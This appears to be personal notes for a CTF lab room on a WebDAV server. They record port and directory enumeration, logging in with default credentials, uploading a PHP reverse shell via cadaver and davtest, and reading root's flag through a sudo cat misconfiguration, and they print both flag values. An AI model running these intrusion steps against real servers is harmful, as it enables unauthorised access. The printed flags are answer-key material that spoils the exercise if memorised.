## Nmap

```
─[glack@parrot]─[~/Desktop/THM]
└──╼ $nmap -sV -sT -A 10.10.222.224
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-02 19:21 IST
Nmap scan report for 10.10.222.224
Host is up (0.13s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.09 seconds
```

## HTTP

```
─[glack@parrot]─[~/Desktop/THM]
└──╼ $feroxbuster -u http://10.10.222.224/ -w /usr/share/wordlists/small.txt -n -x html,php
```

found login at

```
401       14l       54w      460c http://10.10.195.171/webdav
```


Used write up and found 


A basic search for `webdav default credentials` will lead us to [this page](http://xforeveryman.blogspot.com/2012/01/helper-webdav-xampp-173-default.html) and give us the default credentials: `wampp:xampp`.


There is a file password.dav with the contents

```
wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91
```


https://hashcat.net/wiki/doku.php?id=example_hashes

From here i found out this is a 

|   |   |
|---|---|
|1600|Apache $apr1$ MD5, md5apr1, MD5 (APR) 2|

```bash
┌─[glack@parrot]─[~/Desktop/THM/dav]
└──╼ $hashcat -a 0 -m 1600 forjohn.txt /usr/share/wordlists/rockyou.txt
```

tried this command but was unable to find the desired hash in rockyou wordlist

Upon reading a writeup i found out that a `cadaver` tool is required to interact with a webdav directory listing

Webdav info

![wiki protocol](https://kartibok.github.io/Capture-the-Flag/images/dav_webdav_protocol.png)  


![cadaver](https://kartibok.github.io/Capture-the-Flag/images/dav_cadaver.png)


## Cadaver

```
dav:!> help
Available commands: 
 ls         cd         pwd        put        get        mget       mput       
 edit       less       mkcol      cat        delete     rmcol      copy       
 move       lock       unlock     discover   steal      showlocks  version    
 checkin    checkout   uncheckout history    label      propnames  chexec     
 propget    propdel    propset    search     set        open       close      
 echo       quit       unset      lcd        lls        lpwd       logout     
 help       describe   about      
Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye

```

cadaver provide the above list of commands/options to interact with a webdav server.

Upon rechecking the default creds url, i saw that the cadaver command can also be used like this to interact with a specific web server

```
─[✗]─[glack@parrot]─[~/Desktop/THM/dav]
└──╼ $sudo apt install cadaver
```

```
─[glack@parrot]─[~/Desktop/THM/dav]
└──╼ $cadaver http://10.10.85.241/webdav
```

```
Authentication required for webdav on server `10.10.85.241':
Username: wampp
Password: 

```


Upon checking the available options we understand that we are able to upload onto the server using put command

```
dav:/webdav/> put php-reverse-shell.php 
```

I uplaoded my php reverse shell (changed the ip in the reverse shell file)

started a netcat listener and triggered the php from the browser and i got a shell

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

and the user flag in the 
`merlin` directory

```
$ cat user.txt
449b40fe93f78a938523b7e4dcd66d2a

```

## Priv Esc

Upon checking the standard methods for priv esc, we observer that the `www-data` user is able to run the `/bin/cat` command as super user

```
$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat

```

Using this we are easily able to read the root  files and folder/flag without the root shell

```
$ sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5

```


---



2nd time solving


- used [[1. davtest]]. command below
```
davtest -uploadfile php-reverse-shell.php -uploadloc webdav.php -url http://10.10.78.230/webdav -auth wampp:xampp   ✔  18:54:54   
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.78.230/webdav
********************************************************
 unless  Uploading file
Upload succeeded: http://10.10.78.230/webdav/webdav.php
```

- got a reverse shell 
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data
```

- 1st flag
```
$ cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
```

- priv esc and 2nd flag

```
$ sudo -l 
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
$ sudo /bin/cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
$ 
```

